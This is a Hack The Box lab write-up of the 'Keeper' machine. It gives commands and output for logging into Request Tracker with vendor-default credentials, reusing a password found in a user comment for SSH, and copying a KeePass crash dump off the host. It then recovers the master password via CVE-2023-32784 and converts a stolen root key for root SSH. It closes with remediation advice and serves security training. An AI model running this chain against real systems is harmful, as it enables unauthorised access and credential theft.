---
title: "Keeper — Default Credentials to KeePass Memory Disclosure"
description: "Default Request Tracker credentials and a password stored in a comment field provide user access; KeePass master-password recovery from a crash dump (CVE-2023-32784) unlocks an unencrypted root SSH key."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - default-credentials
  - keepass
  - cve-2023-32784
  - memory-disclosure
objective: "Chain default Request Tracker credentials and KeePass CVE-2023-32784 to a root SSH key"
tools:
  - nmap
  - curl
  - ssh
  - unzip
  - scp
  - keepass_dump.py
  - kpcli
  - puttygen
skill: "Default-credential chaining and memory-dump master-password recovery"
outcome: "Root SSH access"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Ubuntu 22.04 Linux host running Request Tracker 4.4.4 behind nginx |
| Starting position | Unauthenticated network access |
| Objective | Chain default Request Tracker credentials and KeePass CVE-2023-32784 to a root SSH key |
| Outcome | User-level SSH access, then direct root SSH access |

## Default credentials to KeePass memory disclosure

Keeper is an Easy-rated Hack The Box Linux lab that chains a default-credential weakness in Request Tracker with the KeePass master-password memory-disclosure flaw (CVE-2023-32784). The helpdesk system is reachable with publicly documented default credentials, an administrative comment field exposes a user password, and a KeePass crash dump in that user's home directory yields the master password. An unencrypted PuTTY-format root SSH key inside the unlocked database then authenticates directly as root. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and leaves command syntax intact. See [how evidence is handled](/method/).

**Attack path:** **Default Request Tracker credentials → password in a ticket comment field → SSH as low-privilege user → KeePass crash dump → CVE-2023-32784 master-password recovery → unencrypted root key in the KeePass database → PuTTY-to-OpenSSH conversion → root SSH**

## Ubuntu Request Tracker vhost, unauthenticated, full compromise objective

- **Target:** Ubuntu 22.04 Linux host running Request Tracker 4.4.4 and served by nginx.
- **Exposed services:** SSH (22) and HTTP (80).
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** reach full compromise by following the exposed services and the credential exposure they present.
- **Constraints:** activity stayed inside the Hack The Box lab environment; the ticketing application is served on a virtual host.

## Evidence: default login to KeePass dump to root key

### 1. Service Enumeration

Observation: a full TCP scan followed by a targeted version and default-script scan exposes two services. HTTP serves a minimal page containing a link to a ticketing application on a virtual host.

```bash
nmap -p- --min-rate 10000 -oA <OUT_PREFIX> <TARGET_IP>
nmap -p 22,80 -sCV -oA <OUT_PREFIX> <TARGET_IP>
```

Truncated scan output:

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

The linked page points to the helpdesk application:

```html
<a href="http://<APP_VHOST>/rt/">To raise an IT support ticket, please visit here</a>
```

Significance: the web service is a pointer to a helpdesk application rather than the application itself, so the ticketing layer is the primary attack surface.

Result: SSH and nginx are exposed, and the web page links to the Request Tracker instance.

### 2. Request Tracker Default Credentials

Observation: the login page footer identifies the application and version, `RT 4.4.4+dfsg-2ubuntu1 (Debian)`. Request Tracker's default administrative credentials are publicly documented.

```bash
curl -s -c <COOKIE_FILE> -X POST http://<APP_VHOST>/rt/NoAuth/Login.html \
  -d 'user=<ADMIN_USER>&pass=<ADMIN_DEFAULT_PASSWORD>' -L | grep -i "logged in\|logout\|dashboard"
```

Version disclosed in the login page footer:

```text
RT 4.4.4+dfsg-2ubuntu1 (Debian)
```

Significance: unchanged default credentials expose user records, ticket content, and attached files to anyone who tries the documented values.

Result: a successful administrator login with an accessible dashboard is reported.

### 3. User Enumeration and Credential Recovery

Observation: the administrator interface lists user accounts. One profile stores an initial password in the Comments field, and a recently viewed ticket references a KeePass crash dump in that user's home directory.

Interface: the affected profile and its ticket are reached through **Admin → Users**; both are reproduced below.

Profile excerpt (identity generalized):

```text
Username: <LAB_USER>
Comments: New user. Initial password set to <LAB_USER_PASSWORD>
```

Ticket excerpt:

```text
Subject: Issue with Keepass Client on Windows
Attached to this ticket is a crash dump of the keepass program...
I have saved the file to my home directory and removed the attachment...
```

Significance: an initial password stored in a ticket comment is readable by every administrative user and by anyone who reaches admin access, and the ticket itself discloses where the crash dump was copied.

Result: a user password is recovered and a crash-dump path is disclosed.

### 4. SSH Access as a Low-Privilege User

Observation: I tried the password recovered from the comment field against the operating system account, and it was accepted.

```bash
ssh <LAB_USER>@<TARGET_HOST>
# password: <LAB_USER_PASSWORD>
```

```text
Welcome to Ubuntu 22.04.3 LTS
<LAB_USER>@<TARGET_HOST>:~$
```

Significance: the same secret crosses from the ticketing system to SSH, so a helpdesk disclosure becomes interactive host access.

Result: an interactive shell as `<LAB_USER>` is obtained.

### 5. Home Directory Enumeration: KeePass Crash Dump

Observation: the user's home directory contains an archive holding a KeePass memory dump and a database file.

```bash
ls -la
unzip <ARCHIVE_FILE>
```

```text
  inflating: KeePassDumpFull.dmp
  extracting: passcodes.kdbx
```

Significance: a process memory dump stored beside a KeePass database points directly at CVE-2023-32784, which recovers the master password from memory.

Result: `KeePassDumpFull.dmp` and `passcodes.kdbx` are extracted.

### 6. CVE-2023-32784: KeePass Master-Password Recovery from Memory

Observation: KeePass 2.x before 2.54 allocates a new managed string for every keystroke of the master password, so the heap retains progressively longer partial strings. Those strings are not zeroed, and a memory dump captured after entry exposes all but the first character.

```bash
# On attack machine
scp <LAB_USER>@<TARGET_HOST>:<DUMP_PATH> .
scp <LAB_USER>@<TARGET_HOST>:<DATABASE_PATH> .
python3 keepass_dump.py -f <DUMP_FILE>
```

Truncated tool output (candidate values generalized):

```text
Possible password: ●,<PASSWORD_FRAGMENT>
Possible password: ●l<PASSWORD_FRAGMENT>
Possible password: ●`<PASSWORD_FRAGMENT>
```

Significance: the tool cannot recover the first character, shown as `●`, and returns several candidate first characters. The full passphrase was inferred from the surviving phrase and the user context recorded in the ticket. Because the dump can persist in swap files and hibernation images, the exposure outlives the running application.

Result: the master-password candidate is recovered from the dump and resolved from context.

### 7. KeePass Database Access: Root SSH Key Recovery

Observation: the resolved master password unlocks the database, whose Network group holds a PuTTY-format root SSH key in the Notes field of an entry.

```bash
kpcli:/> open <DATABASE_FILE>
# master password prompt
kpcli:/> cd passcodes/
kpcli:/passcodes> cd Network/
kpcli:/passcodes/Network> show -f 0
```

Truncated entry output (credentials redacted):

```text
Title: <TARGET_HOST> (Ticketing Server)
Username: <ROOT_ACCOUNT>
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-<KEY_DATE>
       Public-Lines: 6
```

Significance: a root private key is stored unencrypted in a password-manager note, and the key uses the PuTTY v3 format that OpenSSH does not read directly.

Result: the unencrypted root key is extracted from the database.

### 8. PuTTY Key Conversion and Root Access

Observation: a PuTTY v3 key must be converted before OpenSSH will use it, and `puttygen` performs that conversion.

```bash
puttygen <KEY_FILE> -O private-openssh -o <OPENSSH_KEY>
chmod 600 <OPENSSH_KEY>
ssh -i <OPENSSH_KEY> <ROOT_ACCOUNT>@<TARGET_HOST>
```

```text
Welcome to Ubuntu 22.04.3 LTS
root@<TARGET_HOST>:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Significance: the converted key authenticates straight to root over SSH with no further escalation, and the privileged `id` output confirms the execution context.

Result: a root SSH session is obtained.

## Obstacles: missing first password character and PuTTY v3 format

| Challenge | Decision | Rationale |
|---|---|---|
| KeePass master password recovered with an unknown first character | Resolved the remaining phrase from the user context in the ticket | CVE-2023-32784 cannot recover the first character; the rest of the phrase plus documented user context identifies the full passphrase |
| PuTTY v3 key not convertible with `ssh-keygen` | Converted the key with `puttygen` | `ssh-keygen` handles only PuTTY v2; the v3 key produced `do_convert_from_ssh2: parse key: invalid format`, while `puttygen` emits a standard OpenSSH private key |

## Outcome: low-privilege SSH then direct root SSH

The case demonstrates user-level SSH access obtained from a password stored in a ticket comment, then direct root SSH access using an unencrypted PuTTY key recovered from the KeePass database. The static nginx page was enumeration-only, and no vulnerability in the operating system itself was exploited; every escalation followed exposed or recoverable credentials.

## Recommendations: default logins, ticket secrets, KeePass dumps, key encryption

The remediations below are recommendations; no validation is documented.

1. **Change default credentials before deployment.** Request Tracker ships documented default administrative credentials, and unchanged defaults exposed the entire ticketing system. *Recommendation:* require a credential change before an application is reachable, and scan for vendor defaults after deployment. *Detection:* log successful logins to default or unused administrative accounts for review.
2. **Keep secrets out of ticket fields.** A user's initial password sat in a comment field and was reused for SSH. *Recommendation:* deliver initial credentials out of band, force rotation on first use, and store secrets in a dedicated manager with audit logging. *Detection:* scan ticket and profile text for credential-like patterns.
3. **Patch KeePass and limit dump exposure.** CVE-2023-32784 lets the master password be recovered from any memory dump taken after entry, including swap and hibernation images. *Recommendation:* upgrade KeePass to 2.54 or later and rotate stored credentials, since previously captured dumps remain exploitable offline.
4. **Protect and encrypt private keys.** A root SSH key stored unencrypted in a KeePass note turned a database disclosure into direct host compromise. *Recommendation:* store keys encrypted with a strong, separate passphrase, or in hardware-backed storage, rather than as plaintext note content.

## References

- [Hack The Box — Keeper](https://app.hackthebox.com/machines/Keeper) (retired machine)
- [Request Tracker — README](https://docs.bestpractical.com/rt/4.4.4/README.html) (vendor documentation of RT's default `root` / `password` credentials)
- [NVD — CVE-2023-32784](https://nvd.nist.gov/vuln/detail/CVE-2023-32784)
- [KeePass 2.54 release notes](https://keepass.info/news/n230603_2.54.html) (release that fixed CVE-2023-32784)
- [keepass_dump](https://github.com/z-jxy/keepass_dump) (memory-dump master-password recovery tool)
- [kpcli](https://sourceforge.net/projects/kpcli/) (KeePass database command-line client)
- [PuTTY — `puttygen`](https://www.putty.org/) (PuTTY key generation and format conversion)
- [OpenSSH manual pages](https://www.openssh.com/manual.html) (`ssh`, `scp`, and `ssh-keygen`)
- [curl man page](https://curl.se/docs/manpage.html)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
